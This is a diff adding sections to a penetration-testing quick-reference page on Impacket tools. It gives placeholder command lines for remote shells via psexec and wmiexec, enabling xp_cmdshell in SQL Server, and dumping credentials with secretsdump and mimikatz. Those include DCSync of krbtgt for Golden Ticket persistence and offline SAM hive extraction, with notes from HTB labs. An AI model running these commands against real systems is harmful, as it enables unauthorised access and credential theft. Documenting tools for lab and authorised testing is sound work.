@@ -7,6 +7,222 @@ keywords: ["impacket", "psexec", "wmiexec", "secretsdump", "getnpusers", "getuse
 
 {/* Generated from Tools/Quick Reference/Impacket.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## psexec.py: choose the operation and read the result
+
+SMB service shell; requires service-control rights and a writable share, usually local administrator.
+
+### What the result establishes
+
+The returned identity belongs to a service-created process on the remote host; verify it with whoami before using local paths or privileges.
+
+### Prerequisites and common failures
+
+A valid login is insufficient: service creation, writable administrative shares, SMB connectivity and endpoint policy all affect this method.
+
+Valid administrator credentials, SMB access, and writable admin shares/service creation rights on the Windows host.
+
+### Example 1: Password (prompted)
+
+Run in: **Kali**.
+
+```bash
+impacket-psexec 'DOMAIN/USER@TARGET_IP'
+```
+
+### Example 2: NT hash
+
+Run in: **Kali**.
+
+```bash
+impacket-psexec -hashes ':NT_HASH' 'DOMAIN/USER@TARGET_IP'
+```
+
+## wmiexec.py: choose the operation and read the result
+
+Execute through WMI/DCOM; needs RPC access and permissions, plus SMB for default output.
+
+### What the result establishes
+
+Separate successful WMI execution from successful retrieval of stdout; a blank response can be an output-transport problem.
+
+### Prerequisites and common failures
+
+RPC endpoint negotiation, DCOM permissions and the default SMB output path must work; it is not a full interactive terminal.
+
+### Example 1: Password (prompted)
+
+Run in: **Kali**.
+
+```bash
+impacket-wmiexec 'DOMAIN/USER@TARGET_IP'
+```
+
+### Example 2: NT hash
+
+Run in: **Kali**.
+
+```bash
+impacket-wmiexec -hashes ':NT_HASH' 'DOMAIN/USER@TARGET_IP'
+```
+
+## mssqlclient.py: choose the operation and read the result
+
+Connect to Microsoft SQL Server. Choose SQL login or Windows authentication.
+
+### What the result establishes
+
+First distinguish SQL authentication from Windows authentication, then read the server, database and effective login.
+
+### Prerequisites and common failures
+
+A database login does not imply sysadmin, impersonation rights, linked-server access or operating-system execution.
+
+### Example 1: SQL login — password prompted
+
+Run in: **Kali**.
+
+```bash
+impacket-mssqlclient 'USER@TARGET_IP'
+```
+
+### Example 2: Domain account — password prompted
+
+Run in: **Kali**.
+
+```bash
+impacket-mssqlclient -windows-auth 'DOMAIN/USER@TARGET_IP'
+```
+
+### Example 3: Inside the SQL prompt
+
+Run in: **MSSQL prompt**.
+
+```sql
+help
+SELECT SYSTEM_USER;
+SELECT IS_SRVROLEMEMBER('sysadmin');
+SELECT name FROM sys.databases;
+```
+
+### Example 4: OS command — requires appropriate SQL privileges
+
+Run in: **Impacket SQL prompt**. Enables xp_cmdshell on the server.
+
+```text
+enable_xp_cmdshell
+xp_cmdshell whoami
+```
+
+**Login failed** — Confirm SQL authentication versus Windows authentication. Use -windows-auth for the domain account form; verify the SQL instance and port.
+
+**xp_cmdshell permission denied** — A SQL login does not imply sysadmin or OS command execution rights. Check the role query before trying the optional command-execution block.
+
+## secretsdump.py: choose the operation and read the result
+
+Extract credentials with the required local or replication rights.
+
+### What the result establishes
+
+Distinguish local SAM/LSA extraction, an offline hive operation and directory replication; record exactly which artifact was returned.
+
+### Prerequisites and common failures
+
+Local administrator rights do not automatically grant DCSync rights, and an NT hash is not a captured NetNTLM challenge/response.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+impacket-secretsdump -sam sam.save -system system.save LOCAL
+# DCSync: requires directory replication rights
+impacket-secretsdump -just-dc 'DOMAIN/USER:PASSWORD@DC_IP'
+```
+
+### Example 2: Local credential dumping
+
+Run in: **Saved lab example**.
+
+```bash
+# from SAM (local accounts) + LSA
+secretsdump.py -sam sam.save -system system.save LOCAL
+nxc smb $IP -u admin -H <hash> --sam --lsa
+# Windows, in memory
+mimikatz # sekurlsa::logonpasswords
+mimikatz # lsadump::sam
+```
+
+Saved context: [DCSync and Credential Dumping: Quick Reference — Local credential dumping](/active-directory/dcsync-credential-dumping#local-credential-dumping). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: 11. Attacking SAM, SYSTEM & SECURITY
+
+Run in: **Saved lab example**.
+
+```bash
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
+
+Saved context: [Password Attacks: Cracking, Files, and Credential Stores — 11. Attacking SAM, SYSTEM & SECURITY](/password-attacks/password-attacks-cheat-sheet#11-attacking-sam-system-&-security). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: 3. DCSync (Domain Admin → any hash, no host access)
+
+Run in: **Saved lab example**.
+
+```bash
+impacket-secretsdump 'domain/DA_user:pass'@<DC> -just-dc-user Administrator
+impacket-secretsdump 'domain/DA_user:pass'@<DC> -just-dc-user krbtgt    # Golden Ticket persistence
+mimikatz # lsadump::dcsync /domain:nexura.htb /user:Administrator
+```
+
+Saved context: [Windows Post-Exploitation: Field Reference — 3. DCSync (Domain Admin → any hash, no host access)](/cheatsheets/windows-post-exploitation#3-dcsync-domain-admin-→-any-hash-no-host-access). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: C. SeBackup / SeRestore → read any file
+
+Run in: **Saved lab example**.
+
+```cmd
+:: grab SAM + SYSTEM (local account hashes)
+reg save HKLM\SAM  C:\Temp\SAM
+reg save HKLM\SYSTEM C:\Temp\SYSTEM
+:: on a DC, snapshot NTDS via diskshadow + robocopy /b (backup mode), then:
+:: on Kali:  impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
+
+Saved context: [Windows Post-Exploitation: Field Reference — C. SeBackup / SeRestore → read any file](/cheatsheets/windows-post-exploitation#c-sebackup-/-serestore-→-read-any-file). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: Credential / Hash Operations
+
+Run in: **Saved lab example**.
+
+```bash
+secretsdump.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
+    # Dump credential material if sufficiently privileged
+
+secretsdump.py -just-dc '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
+    # Extract NTDS domain credentials if sufficiently privileged
+
+hashcat -m 13100 hashes.txt wordlist.txt
+    # Crack Kerberos TGS-REP hashes
+```
+
+Saved context: [Active Directory Enumeration Commands — Credential / Hash Operations](/active-directory/command-reference#credential-/-hash-operations). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: 2. SAM / LSA secrets / cached (local + service creds)
+
+Run in: **Saved lab example**.
+
+```cmd
+mimikatz # lsadump::sam            :: local account NTLM hashes (from SAM)
+mimikatz # lsadump::secrets        :: LSA secrets = service-account PLAINTEXT passwords
+mimikatz # lsadump::cachedump      :: cached domain logons (crackable as $DCC2$)
+:: or remotely from Kali with admin creds:
+impacket-secretsdump 'domain/user:pass'@<host>
+```
+
+Saved context: [Windows Post-Exploitation: Field Reference — 2. SAM / LSA secrets / cached (local + service creds)](/cheatsheets/windows-post-exploitation#2-sam-/-lsa-secrets-/-cached-local-+-service-creds). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Existing notes and worked examples
+
 **Start with the service and the individual script name.** Kali commonly uses `impacket-NAME`; HTB notes often use `NAME.py`. Check the specific program with `-h`.
 
 | Service / task | Script names | Open the command reference |
